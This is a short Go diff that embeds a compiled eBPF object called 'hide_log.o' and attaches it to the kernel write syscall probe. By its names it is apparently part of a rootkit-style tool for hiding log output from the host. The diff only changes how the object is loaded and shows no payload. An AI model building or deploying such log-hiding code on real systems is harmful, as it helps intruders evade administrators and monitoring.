@@ -1,15 +1,20 @@
 package core
 
 import (
+	"bytes"
+	_ "embed"
 	"fmt"
 
 	"github.com/cilium/ebpf"
 	"github.com/cilium/ebpf/link"
 )
 
+//go:embed obj/hide_log.o
+var hideLogObj []byte
+
 // Load and attach the hide_log eBPF program to kprobe __x64_sys_write
 func LoadAndAttachHideLog() (link.Link, error) {
-	spec, err := ebpf.LoadCollectionSpec("bpf/hide_log.o")
+	spec, err := ebpf.LoadCollectionSpecFromReader(bytes.NewReader(hideLogObj))
 	if err != nil {
 		return nil, fmt.Errorf("failed to load spec: %w", err)
 	}
